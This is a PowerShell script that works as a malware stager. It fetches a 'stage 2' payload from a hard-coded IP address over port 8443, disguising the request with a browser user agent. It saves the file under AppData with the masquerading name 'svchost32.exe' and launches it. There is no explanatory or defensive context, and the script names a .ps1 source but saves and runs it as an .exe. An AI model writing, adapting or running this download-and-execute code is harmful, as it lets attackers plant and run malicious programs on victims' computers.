
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://203.0.113.45:8443/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\svchost32.exe",
    [int]$TimeoutSec = 102,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Invoke-PayloadFetch -SourceUrl $TargetUrl -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec -UserAgent $RequestAgent
    if ($OperationResult) {
        Start-Process -FilePath $Stage2Path
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
